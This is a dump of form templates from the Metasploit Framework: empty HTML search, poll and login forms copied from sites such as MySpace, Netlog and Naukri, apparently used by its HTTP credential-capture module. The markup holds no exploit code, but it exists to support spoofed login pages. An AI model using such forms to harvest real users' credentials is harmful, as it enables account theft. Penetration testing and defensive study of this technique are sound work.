{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/mlb.com.txt", "content": "<form name='hdr_search' action='http://mlb.mlb.com/searchGlobalSearchServlet' id='hdr_search' method='get' onsubmit='return validateSearchText()'> <input name=\"club\" type=\"hidden\" value=\"\" /><input name=\"search_mode\" type=\"hidden\" value=\"\" /><input name=\"searchtypeid\" type=\"hidden\" id=\"searchtypeid\" value=\"\" /><input name=\"page_number\" type=\"hidden\" value=\"\" /><input name=\"query_text1\" size=\"20\" class=\"textXs\" type=\"text\" id=\"query_text1\" value=\"\" onfocus=\"this.value=''\" /><input type=\"image\" src=\"/images/team/img_search_button.gif\" align=\"absmiddle\" /></form>", "timestamp": "2025-10-24T23:41:00.515265"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/mobile.de.txt", "content": "<form action='http://www.mobile.de/home/changeLanguage.html' id='toggleLanguageForm' method='get'> <input type=\"submit\" id=\"sendLanguage\" value=\"\" /></form><form name='searchForm' action='http://suchen.mobile.de/fahrzeuge/search.html' method='GET' id='searchForm'> <input name=\"isSearchRequest\" type=\"hidden\" value=\"\" /><input name=\"editSearch\" type=\"hidden\" value=\"\" /><input name=\"scopeId\" type=\"hidden\" value=\"\" /><input name=\"country\" type=\"hidden\" value=\"\" /><input name=\"negativeFeatures\" type=\"hidden\" value=\"\" /><input name=\"lang\" type=\"hidden\" value=\"\" /><input name=\"sortOption.sortBy\" type=\"hidden\" value=\"\" /><input name=\"sortOption.sortOrder\" type=\"hidden\" value=\"\" /><input name=\"zipcode\" class=\"text\" type=\"text\" id=\"zipcode\" style=\"width: 97%\" /><input name=\"doSearch\" src=\"/static/graphics/forms/detailsuche_de.gif\" type=\"IMAGE\" onclick=\"submitQuickSearch(true);\" /><input name=\"doSearch\" src=\"/static/graphics/forms/formsuchen_de.gif\" type=\"IMAGE\" onclick=\"submitQuickSearch(false);\" /></form>", "timestamp": "2025-10-24T23:41:00.851455"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/monster.com.txt", "content": "<form action='http://www.monster.com/1hr_ttl/2.asp' method='POST' id='SR01'> <input name=\"q\" class=\"text\" type=\"text\" id=\"q\" value=\"\" onfocus=\"clearInput(this, 'Enter keywords (e.g., nurse, sales)')\" onblur=\"resetInput(this, 'Enter keywords (e.g., nurse, sales)')\" /><input name=\"jto\" class=\"chb\" type=\"checkbox\" id=\"titles\" /><input name=\"cnme\" type=\"text\" id=\"cnme\" value=\"\" onfocus=\"clearInput(this, 'Enter City')\" onblur=\"resetInput(this, 'Enter City')\" /><input name=\"rad_units\" type=\"hidden\" id=\"rad_units\" value=\"\" /><input name=\"zip\" type=\"text\" id=\"zip\" value=\"\" onfocus=\"clearInput(this, 'Enter ZIP Code')\" onblur=\"resetInput(this, 'Enter ZIP Code')\" /><input name=\"activetab\" type=\"hidden\" id=\"activetab\" value=\"\" /><input name=\"re\" type=\"hidden\" id=\"re\" value=\"\" /><input name=\"cy\" type=\"hidden\" id=\"cy\" value=\"\" /><input name=\"brd\" type=\"hidden\" id=\"brd\" value=\"\" /></form><form action='http://salary.monster.com/salarywizard/layoutscripts/swzl_keywordtitleselect.asp' id='KnowValueForm'> <input name=\"searchtextvalue\" type=\"text\" id=\"searchtextvalue\" value=\"\" onfocus=\"clearInput(this, 'Enter your job title')\" onblur=\"resetInput(this, 'Enter your job title')\" /></form><form action='http://forums.monster.com/poll.asp' method='get'> <input name=\"pollid\" type=\"hidden\" value=\"\" /><input name=\"choiceid\" type=\"radio\" value=\"\" /><input name=\"choiceid\" type=\"radio\" value=\"\" /><input name=\"choiceid\" type=\"radio\" value=\"\" /><input type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:01.178195"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/mozilla.org.txt", "content": "<form title='mozilla.org Search' action='http://www.google.com/cse' id='searchbox_002443141534113389537:ysdmevkkknw'> <input name=\"cx\" type=\"hidden\" value=\"\" /><input name=\"cof\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"30\" type=\"text\" id=\"q\" accesskey=\"s\" /><input type=\"submit\" id=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:02.179029"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/msn.ca.txt", "content": "<form class='simple1' action='http://search.live.com/results.aspx' method='get' id='srchfrm'> <input name=\"q\" size=\"75\" class=\"\" title=\"\" type=\"text\" id=\"f1\" accesskey=\"S\" value=\"\" maxlength=\"250\" /><input name=\"FORM\" type=\"hidden\" value=\"\" /><input name=\"mkt\" type=\"hidden\" value=\"\" /><input name=\"setlang\" type=\"hidden\" value=\"\" /><input class=\"button\" type=\"submit\" value=\"\" /><input name=\"rf\" class=\"country\" type=\"checkbox\" value=\"\" /></form><form action='http://sympatico.msn.ca/' id='f4111819266' method='get'> <input name=\"pollId\" type=\"hidden\" id=\"p4111819266\" value=\"\" /><input name=\"vote\" type=\"hidden\" value=\"\" /><input name=\"voteshowresults\" type=\"hidden\" value=\"\" /><input name=\"pollcontent\" type=\"hidden\" value=\"\" /><input name=\"jsdisabled\" type=\"hidden\" value=\"\" /><input name=\"polluid\" type=\"hidden\" value=\"\" /><input name=\"q1\" type=\"radio\" id=\"p4111819266q1c1\" value=\"\" /><input name=\"q1\" type=\"radio\" id=\"p4111819266q1c2\" value=\"\" /><input name=\"q1\" type=\"radio\" id=\"p4111819266q1c3\" value=\"\" /><input name=\"q1\" type=\"radio\" id=\"p4111819266q1c4\" value=\"\" /><input type=\"submit\" id=\"submit4111819266\" value=\"\" onclick=\"javascript:return Vote('4111819266',false,'Please choose an answer for every question');\" /></form><form class='simple1' action='http://ca.moneycentral.msn.com/investor/quotes/quotes.asp' method='get'> <input name=\"Symbol\" size=\"25\" class=\"hint\" title=\"\" type=\"text\" id=\"Text1\" accesskey=\"q\" value=\"\" maxlength=\"140\" /><input class=\"button\" type=\"submit\" value=\"\" /></form><form class='simple1' action='http://weather.msn.com/search.aspx' method='get'> <input name=\"weasearchstr\" size=\"30\" class=\"hint\" title=\"\" type=\"text\" id=\"wesdaser\" accesskey=\"W\" value=\"\" maxlength=\"250\" /><input class=\"button\" type=\"submit\" value=\"\" /></form><form class='simple6' action='http://search.sympatico.msn.ca/results.aspx' method='get'> <input name=\"q\" size=\"40\" class=\"\" title=\"\" type=\"text\" id=\"footersearch\" accesskey=\"f\" value=\"\" maxlength=\"250\" /><input name=\"FORM\" type=\"hidden\" value=\"\" /><input class=\"button\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:02.503652"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/msn.com.txt", "content": "<form class='simple6' action='http://search.msn.com/results.aspx' method='get' id='srchfrm' xmlns:cp.request='urn:CP.Request'> <input name=\"q\" size=\"75\" type=\"text\" id=\"f1\" accesskey=\"S\" maxlength=\"250\" /><input name=\"FORM\" type=\"hidden\" value=\"\" /><input class=\"button\" type=\"submit\" value=\"\" /></form><form class='simple1' action='http://entertainment.msn.com/search/entertainment/default.aspx' method='get'> <input name=\"st\" size=\"25\" class=\"hint\" title=\"MSN Entertainment\" type=\"text\" id=\"s1\" value=\"\" maxlength=\"100\" /><input class=\"button\" type=\"submit\" value=\"\" /></form><form class='simple1' action='http://moneycentral.msn.com/detail/stock_quote ' method='get'> <input name=\"Symbol\" size=\"25\" class=\"hint\" title=\"Get Quotes\" type=\"text\" id=\"getquote\" accesskey=\"q\" value=\"\" maxlength=\"140\" /><input class=\"button\" type=\"submit\" value=\"\" /></form><form class='simple1' action='http://weather.msn.com/search.aspx' method='get'> <input name=\"weasearchstr\" size=\"30\" class=\"hint\" type=\"text\" id=\"wesdaser\" accesskey=\"Z\" value=\"\" maxlength=\"250\" /><input class=\"button\" type=\"submit\" value=\"\" /></form><form class='simple1' action='http://shopping.msn.com/results/shp/?ptnrid=225,ptnrdata=100001' method='get'> <input name=\"text\" size=\"25\" class=\"hint\" type=\"text\" id=\"ShoppingSearchValue\" value=\"\" maxlength=\"200\" /><input class=\"button\" type=\"submit\" value=\"\" /></form><form class='simple6' action='http://search.msn.com/results.aspx' method='get' id='spyft'> <input name=\"q\" size=\"40\" type=\"text\" id=\"footersearch\" maxlength=\"250\" /><input name=\"FORM\" type=\"hidden\" value=\"\" /><input class=\"button\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:02.870331"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/mtv.com.txt", "content": "<form name='search' action='/search/' method='get'> <input name=\"searchterm\" onkeypress=\"catchEnter(this.form)\" type=\"text\" id=\"searchmtv-text\" value=\"\" onclick=\"this.value='';\" /><input type=\"image\" src=\"/sitewide/images/u/btn-comgo.gif\" id=\"searchmtv-btn\" alt=\"Go\" onclick=\"submitSearch(this.form); return false;\" /></form>", "timestamp": "2025-10-24T23:41:03.215173"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/multiply.com.txt", "content": "<form class='hform mobileform' action='/user/signin' method='post'> <input name=\"form::signin\" type=\"hidden\" value=\"\" /><input name=\"form::signin::count\" type=\"hidden\" value=\"\" /><input name=\"signin::xurl\" type=\"hidden\" id=\"xurl\" value=\"\" /><input name=\"signin::remember_me_for\" type=\"hidden\" id=\"remember_me_for\" value=\"\" /><input name=\"signin::id\" class=\"textfield\" type=\"text\" id=\"id\" value=\"\" style=\"width: 100px\" /><input name=\"signin::password\" class=\"textfield\" type=\"password\" id=\"password\" value=\"\" style=\"width: 100px\" /><input checked name=\"signin::remember\" class=\"checkbox\" type=\"checkbox\" id=\"remember\" /><input class=\"submit\" type=\"submit\" value=\"\" /><input name=\"omniture_submission\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:03.537869"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/musica.com.txt", "content": "<form action='letras.asp?bus=OK' method='POST'> <input name=\"T1\" size=\"18\" type=\"text\" value=\"\" style=\"font-family:Tahoma;font-size:8pt\" /><input name=\"B1\" type=\"submit\" value=\"\" style=\"font-size:8pt;font-family:Tahoma\" /></form><form action='letras.asp' method='GET' target='_top'> <input name=\"sitesearch\" type=\"hidden\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"forid\" type=\"hidden\" value=\"\" /><input name=\"channel\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"oe\" type=\"hidden\" value=\"\" /><input name=\"cof\" type=\"hidden\" value=\"\" /><input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"42\" type=\"text\" value=\"\" maxlength=\"255\" style=\"font-family:Tahoma;font-size:10pt\" /><input name=\"sa\" type=\"submit\" id=\"sbb\" value=\"\" style=\"font-family:Tahoma;font-size:8pt\" /></form>", "timestamp": "2025-10-24T23:41:03.856536"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/myfreepaysite.com.txt", "content": "<form name='frmLogin' action='http://www.myfreepaysite.com/regTemp.php' onsubmit='return validate();' method='post'> <input name=\"emailID\" value=\"\" onfocus=\"clearbox();\" maxlength=\"60\" /><input name=\"image8\" onmouseover=\"MM_swapImage('image','','images/button_f2.gif',1);\" type=\"image\" src=\"images/button.gif\" border=\"0\" vspace=\"2\" height=\"40\" onmouseout=\"MM_swapImgRestore()\" alt=\"Click here after entering your e-mail address.\" width=\"68\" /><input name=\"agecheck\" type=\"checkbox\" value=\"\" /></form><form name='frmLogin2' action='http://www.myfreepaysite.com/regTemp.php' method='post' onsubmit='return validate2();'> <input name=\"emailID\" value=\"\" onfocus=\"clearbox2();\" maxlength=\"60\" /><input name=\"image8\" onmouseover=\"MM_swapImage('image','','images/button_f2.gif',1);\" type=\"image\" src=\"images/button.gif\" border=\"0\" vspace=\"2\" height=\"40\" onmouseout=\"MM_swapImgRestore()\" alt=\"click now to submit your email address\" width=\"68\" /><input name=\"agecheck\" type=\"checkbox\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:04.175452"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/mynet.com.txt", "content": "<form name='searchForm' action='http://arama.mynet.com/search.aspx' id='searchForm' method='get'> <input name=\"q\" class=\"headerInput\" type=\"text\" id=\"q\" value=\"\" onchange=\"javascript:aramatext=document.searchForm.q.value;\" /><input type=\"image\" src=\"\" onclick=\"_lcjson(1131);\" /></form><form name='eksenForm' action='http://eksenim.mynet.com/ep/SearchResults.aspx' onsubmit='return getEksenim(this);' method='get' accept-charset='utf-8' style='margin:0px'> <input name=\"SearchType\" type=\"hidden\" value=\"\" /><input name=\"searchKey\" class=\"eksenInput1\" type=\"text\" value=\"\" onfocus=\"this.value='';\" onclick=\"this.value='';\" /><input class=\"eksenInput2\" type=\"image\" src=\"\" onclick=\"_lcjson(1080);\" /></form><form action='http://register.mynet.com/DNSSearch.aspx' method='post' style='margin:0px 0px 0px 6px'> <input name=\"SRS_DOMAIN_LIST\" class=\"todaysInput\" type=\"text\" value=\"\" onfocus=\"this.value='';\" onclick=\"this.value='';\" /><input type=\"image\" src=\"\" onclick=\"_lcjson(1147);\" /></form><form name='sform' action='http://bilenkazanir.mynet.com/anasayfacevap_new.asp' method='post' style='width:540px;margin:0px;display:table' target='_blank'> <input name=\"soru0\" type=\"hidden\" value=\"\" /><input name=\"secenek0\" type=\"radio\" value=\"\" /><input name=\"secenek0\" type=\"radio\" value=\"\" /><input name=\"secenek0\" type=\"radio\" value=\"\" /><input name=\"secenek0\" type=\"radio\" value=\"\" /><input type=\"image\" src=\"\" alt=\"Sonuclar\" onclick=\"_lcjson(1106);\" /></form>", "timestamp": "2025-10-24T23:41:04.496265"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/myspace.com.txt", "content": "<form name='srch' action='http://searchservice.myspace.com/index.cfm?' id='srch' onsubmit='return (document.getElementById(search_q).value.length > 0);' method='get' style='padding:0;margin:0;'> <input name=\"fuseaction\" type=\"hidden\" id=\"fuseaction\" value=\"\" /><input name=\"type\" type=\"hidden\" id=\"search_t\" value=\"\" /><input name=\"qry\" class=\"srchTextfld\" type=\"text\" id=\"search_q\" value=\"\" maxlength=\"100\" /><input name=\"submit\" type=\"submit\" id=\"submit\" value=\"\" /></form><form name='aspnetForm' action='http://secure.myspace.com/index.cfm?fuseaction=login.process' method='post' id='LoginForm'> <input name=\"__VIEWSTATE\" type=\"hidden\" id=\"__VIEWSTATE\" value=\"\" /><input name=\"NextPage\" type=\"hidden\" id=\"NextPage\" value=\"\" /><input name=\"ctl00$ctl00$Main$cpMain$LoginBox$Email_Textbox\" tabindex=\"1\" type=\"text\" id=\"ctl00_ctl00_Main_cpMain_LoginBox_Email_Textbox\" /><input name=\"ctl00$ctl00$Main$cpMain$LoginBox$Password_Textbox\" tabindex=\"2\" type=\"password\" id=\"ctl00_ctl00_Main_cpMain_LoginBox_Password_Textbox\" /><input name=\"ctl00$ctl00$Main$cpMain$LoginBox$Remember_Checkbox\" tabindex=\"4\" class=\"rememberMe\" type=\"checkbox\" id=\"ctl00_ctl00_Main_cpMain_LoginBox_Remember_Checkbox\" value=\"\" /><input name=\"dlb\" tabindex=\"5\" type=\"submit\" id=\"dlb\" value=\"\" onclick=\"javascript: return doSubmit();\" /><input name=\"ctl00$ctl00$Main$cpMain$LoginBox$SingleSignOnHash\" type=\"hidden\" id=\"ctl00_ctl00_Main_cpMain_LoginBox_SingleSignOnHash\" /><input name=\"ctl00$ctl00$Main$cpMain$LoginBox$SingleSignOnRequestUri\" type=\"hidden\" id=\"ctl00_ctl00_Main_cpMain_LoginBox_SingleSignOnRequestUri\" /><input name=\"ctl00$ctl00$Main$cpMain$LoginBox$nexturl\" type=\"hidden\" id=\"ctl00_ctl00_Main_cpMain_LoginBox_nexturl\" /><input name=\"ctl00$ctl00$Main$cpMain$LoginBox$apikey\" type=\"hidden\" id=\"ctl00_ctl00_Main_cpMain_LoginBox_apikey\" /><input name=\"ctl00$ctl00$Main$cpMain$LoginBox$ContainerPage\" type=\"hidden\" id=\"ctl00_ctl00_Main_cpMain_LoginBox_ContainerPage\" /></form><form action='http://searchservice.myspace.com/index.cfm' method='get' id='FrmFindNew'> <input name=\"fuseaction\" type=\"hidden\" value=\"\" /><input name=\"type\" type=\"hidden\" value=\"\" /><input name=\"qry\" type=\"text\" id=\"qry_123\" /></form>", "timestamp": "2025-10-24T23:41:04.834635"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/myvideo.de.txt", "content": "<form name='mv_searchbox' action='/news.php?rubrik=' id='mv_searchbox' method='post' accept-charset='utf-8'> <input name=\"searchWord\" tabindex=\"1\" class=\"topSearchField\" type=\"text\" id=\"searchWord\" value=\"\" /><input name=\"do\" tabindex=\"3\" class=\"btn\" type=\"submit\" value=\"\" onclick=\"SH('wait','inline');\" /></form><form name='formular2' action='http://www.myvideo.de/' id='formular2' method='post' accept-charset='utf-8'> <input name=\"unique_form[4f9834c5]\" type=\"hidden\" value=\"\" /><input name=\"challenge\" type=\"hidden\" id=\"cng\" value=\"\" /><input name=\"response\" type=\"hidden\" id=\"res\" value=\"\" /><input name=\"mv_login_box\" type=\"hidden\" value=\"\" /><input name=\"action\" type=\"hidden\" value=\"\" /><input name=\"function\" type=\"hidden\" value=\"\" /><input name=\"login_username\" tabindex=\"4\" class=\"sInput\" type=\"text\" id=\"login_username\" value=\"\" maxlength=\"30\" /><input name=\"login_password\" tabindex=\"5\" class=\"sInput\" type=\"password\" id=\"login_password\" value=\"\" maxlength=\"30\" /><input name=\"login_save\" checked=\"checked\" tabindex=\"6\" class=\"radio\" type=\"radio\" id=\"login_save_6\" value=\"\" /><input name=\"login_save\" tabindex=\"7\" class=\"radio\" type=\"radio\" id=\"login_save_7\" value=\"\" /><input name=\"do\" tabindex=\"8\" class=\"btn\" type=\"submit\" value=\"\" onclick=\"SH('wait','inline');\" /></form>", "timestamp": "2025-10-24T23:41:05.181570"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/narod.ru.txt", "content": "<form name='search' action='http://narod.yandex.ru/cgi-bin/yandsearch'> </form><form action='http://passport.yandex.ru/passport?from=narod&mode=register&retpath=http://narod.yandex.ru/userarea/after_register.xhtml' method='post'> </form><form action='http://passport.yandex.ru/cgi-bin/Reg.pl?mode=auth&retpath=http://narod.yandex.ru/userarea/after_register.xhtml' method='post'> </form>", "timestamp": "2025-10-24T23:41:05.856170"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/naukri.com.txt", "content": "<form name='quickbar' action='http://jobsearch.naukri.com/mynaukri/mn_newsmartsearch.php' method='post' style='margin:0' target='_self'> <input name=\"xz\" type=\"hidden\" value=\"\" /><input name=\"qp\" autocomplete=\"off\" class=\"textbox\" onkeypress=\"removeError(new Array('qp','qf'),'quickbar');\" type=\"text\" id=\"qp\" value=\"\" maxlength=\"250\" style=\"padding-left: 0px;width:190px\" /><input name=\"ql\" size=\"10\" class=\"textbox\" type=\"text\" value=\"\" maxlength=\"250\" style=\"padding-left: 0px;\" /><input name=\"Submit\" href=\"#\" class=\"textboxn1\" type=\"button\" value=\"\" onclick=\"overlayclose('ctc'); return false\" target=\"_self\" /><input name=\"uen\" type=\"hidden\" id=\"uen\" value=\"\" /><input name=\"usl\" type=\"hidden\" id=\"usl\" value=\"\" /></form><form name='form1' action='http://www.naukri.com/tieups/tieups.php?othersrcp=572' target='_self'> </form><form action='http://login.naukri.com/nLogin/Login.php' method='post' target='_self'> <input name=\"USERNAME\" size=\"15\" type=\"text\" id=\"username\" maxlength=\"100\" /><input name=\"PASSWORD\" size=\"15\" type=\"password\" maxlength=\"40\" /></form>", "timestamp": "2025-10-24T23:41:06.168655"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/naver.com.txt", "content": "<form name='search' action='http://search.naver.com/search.naver' id='search' method='get' onsubmit='nvSetAction(this);'> <input name=\"query\" tabindex=\"2\" title=\"\uac80\uc0c9\ucc3d\" class=\"tx\" type=\"text\" id=\"query\" accesskey=\"s\" /><input tabindex=\"3\" class=\"btn\" type=\"image\" src=\"\" onmouseover=\"this.src='http://static.naver.com/w8/btn_sch_over.gif'\" onmousedown=\"this.src='http://static.naver.com/w8/btn_sch_down.gif'\" onmouseout=\"this.src='http://static.naver.com/w8/btn_sch.gif'\" alt=\"\uac80\uc0c9\" /><input name=\"sm\" type=\"hidden\" value=\"\" /><input name=\"frm\" type=\"hidden\" value=\"\" /></form><form action='http://search.naver.com/search.naver' method='get'> <input name=\"where\" type=\"hidden\" value=\"\" /><input name=\"frm\" type=\"hidden\" value=\"\" /><input name=\"sm\" type=\"hidden\" value=\"\" /><input name=\"searchBtn\" type=\"submit\" value=\"\" /></form><form action='http://stock.naver.com/sise/item_search.nhn' method='get'> <input name=\"command\" type=\"hidden\" value=\"\" /><input name=\"ref\" type=\"hidden\" value=\"\" /><input name=\"query\" title=\"\uc8fc\uac00\uc870\ud68c\" class=\"tx\" type=\"text\" id=\"fncsch\" value=\"\" /><input class=\"btn\" type=\"image\" src=\"\" alt=\"\uc870\ud68c\" /></form>", "timestamp": "2025-10-24T23:41:06.530070"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/nba.com.txt", "content": "<form name='subsForm' action='http://www.nba.com/allaccess/newsletters_signup.jsp' onsubmit='return submitIt(this)' method='GET' style='margin:0px'> <input name=\"email\" type=\"text\" style=\"width:133px;height:16px;_margin-bottom:5px;_font-size:11px;\" /><input name=\"submit\" type=\"image\" src=\"/media/homepage/button_subscribe.gif\" style=\"margin-left:5px;margin-top:5px;\" /></form>", "timestamp": "2025-10-24T23:41:06.870625"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/neopets.com.txt", "content": "<form onsubmit='search_handle(this);' style='padding-top: 4px; padding-bottom: 4px;'> <input name=\"q\" class=\"sf\" type=\"text\" value=\"\" onfocus=\"this.style.color='#000000'; if( this.value=='Enter search text...' ) { this.value=''; }\" maxlength=\"255\" style=\"width: 135px; color: #a5a5a5; padding: 2px;\" onblur=\"if( this.value=='' ) { this.style.color='#A5A5A5'; this.value='Enter search text...'; }\" /><input class=\"sf\" type=\"submit\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"forid\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"oe\" type=\"hidden\" value=\"\" /><input name=\"safe\" type=\"hidden\" value=\"\" /><input name=\"domains\" type=\"hidden\" value=\"\" /><input name=\"cof\" type=\"hidden\" value=\"\" /><input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"s\" type=\"hidden\" /></form><form onsubmit='javascript: search_handle(this);'> <input name=\"q\" size=\"25\" class=\"sf\" type=\"text\" value=\"\" onfocus=\"this.style.color='#000000'; if( this.value=='Enter search text...' ) { this.value=''; }\" maxlength=\"255\" style=\"color: #a5a5a5; padding: 2px;\" onblur=\"if( this.value=='' ) { this.style.color='#A5A5A5'; this.value='Enter search text...'; }\" /><input class=\"sf\" type=\"submit\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"forid\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"oe\" type=\"hidden\" value=\"\" /><input name=\"safe\" type=\"hidden\" value=\"\" /><input name=\"domains\" type=\"hidden\" value=\"\" /><input name=\"cof\" type=\"hidden\" value=\"\" /><input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"s\" type=\"hidden\" /></form><form method='post'> </form>", "timestamp": "2025-10-24T23:41:07.188391"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/netlog.com.txt", "content": "<form action='/go/login' method='post'> <input name=\"action\" type=\"hidden\" value=\"\" /><input name=\"target\" type=\"hidden\" value=\"\" /><input name=\"remember\" type=\"hidden\" value=\"\" /><input name=\"nickname\" size=\"10\" type=\"text\" id=\"headerNicknameText\" maxlength=\"60\" /><input name=\"password\" size=\"10\" type=\"password\" id=\"headerPasswordText\" maxlength=\"20\" /><input name=\"login\" type=\"submit\" id=\"headerLoginButton\" value=\"\" /></form><form action='/go/search/' id='search' method='post'> <input name=\"q\" results=\"10\" autosave=\"com.netlog.search_history\" placeholder=\"\" type=\"search\" id=\"q\" value=\"\" /><input name=\"submit\" type=\"submit\" id=\"submit\" value=\"\" /></form><form action='/go/register' method='post'> <input name=\"action\" type=\"hidden\" value=\"\" /><input name=\"questions[]\" type=\"hidden\" value=\"\" /><input name=\"questions[]\" type=\"hidden\" value=\"\" /><input name=\"questions[]\" type=\"hidden\" value=\"\" /><input name=\"location\" type=\"hidden\" value=\"\" /><input name=\"csvd\" type=\"hidden\" value=\"\" /><input name=\"email\" type=\"text\" id=\"emailText\" value=\"\" style=\"width: 216px\" maxlength=\"80\" /><input name=\"password\" autocomplete=\"off\" type=\"password\" id=\"passwordText\" value=\"\" style=\"width: 216px\" maxlength=\"25\" /><input class=\"buttonRegister\" type=\"submit\" value=\"\" style=\"margin: 0 5px\" /></form><form action='/go/search/' method='post'> <input name=\"q\" type=\"text\" style=\"width: 255px;\" /><input class=\"buttonRegister\" ame=\"submit\" type=\"submit\" value=\"\" style=\"margin: 0 5px;\" /></form>", "timestamp": "2025-10-24T23:41:07.534654"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/newegg.com.txt", "content": "<form name='haFormQuickSearch' action='http://www.newegg.com/Product/ProductList.aspx' method='get' id='haFormQuickSearch' onsubmit='return Biz.Common.QuickSearch.submit();'> <input name=\"Submit\" type=\"hidden\" value=\"\" /><input name=\"DEPA\" type=\"hidden\" value=\"\" /><input name=\"Description\" tabindex=\"1\" autocomplete=\"off\" title=\"Search site\" type=\"text\" id=\"haQuickSearchBox\" value=\"\" maxlength=\"50\" /><input tabindex=\"2\" class=\"csp\" type=\"image\" src=\"\" alt=\"Go\" /></form><form name='frmSubscribe' class='frmSubscribeDailydeals' action='https://secure.newegg.com/NewMyAccount/NewsLetterSubscribe.aspx?Action=Manage' id='frmSubscribe' method='post' onsubmit='return Biz.Common.NewsletterSingup.nSubmit(frmSubscribe,LoginName);' target='newsletterSubscribe'> <input name=\"LoginName\" class=\"emailTextbox\" type=\"text\" id=\"LoginName\" value=\"\" onfocus=\"this.value='';\" /><input class=\"subscribe\" title=\"Subscribe\" type=\"image\" src=\"\" alt=\"Subscribe\" /><input name=\"Subscribe\" type=\"hidden\" value=\"\" /></form><form name='braFormYouTellUs' action='http://secure.newegg.com/Newversion/FeedBack/OnlinePollUnique.asp' id='braFormYouTellUs' method='post'> <input name=\"key\" type=\"hidden\" value=\"\" /><input name=\"pollid\" type=\"hidden\" value=\"\" /><input name=\"PollSubject\" type=\"hidden\" value=\"\" /><input name=\"viewPoll\" type=\"hidden\" id=\"viewPoll\" /><input name=\"PollChoose\" type=\"hidden\" id=\"PollChoose\" /><input name=\"option10013\" type=\"radio\" value=\"\" onclick=\"braFormYouTellUs.PollChoose.value='23'\" /><input name=\"option10013\" type=\"radio\" value=\"\" onclick=\"braFormYouTellUs.PollChoose.value='24'\" /><input name=\"option10013\" type=\"radio\" value=\"\" onclick=\"braFormYouTellUs.PollChoose.value='25'\" /><input name=\"option10013\" type=\"radio\" value=\"\" onclick=\"braFormYouTellUs.PollChoose.value='1147'\" /><input name=\"option10013\" type=\"radio\" value=\"\" onclick=\"braFormYouTellUs.PollChoose.value='1148'\" /></form><form name='trackOrder' action='http://www.newegg.com/Info/TrackOrder.aspx' method='get' id='trackOrder'> <input name=\"TrackingNumber\" type=\"text\" value=\"\" onfocus=\"this.value=''\" /></form>", "timestamp": "2025-10-24T23:41:07.880026"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/newgrounds.com.txt", "content": "<form action='http://www.newgrounds.com/account/' method='post' id='loginboxform' onsubmit='AttemptLogin();return(false);'> <input class=\"hiddensubmit\" type=\"submit\" value=\"\" /><input name=\"lb_username\" class=\"inputfield formtext\" type=\"text\" id=\"lb_username\" maxlength=\"20\" /><input name=\"lb_userpass\" class=\"inputfield formtext\" type=\"password\" id=\"lb_userpass\" maxlength=\"10\" /><input name=\"lb_remember\" type=\"checkbox\" id=\"lb_remember\" value=\"\" /></form><form action='#' method='get' id='search' onsubmit='RunSearch(topsearch, portal);return(false);'> <input size=\"12\" class=\"search inputfield formtext\" type=\"text\" id=\"topsearch_terms\" /></form>", "timestamp": "2025-10-24T23:41:08.209137"}
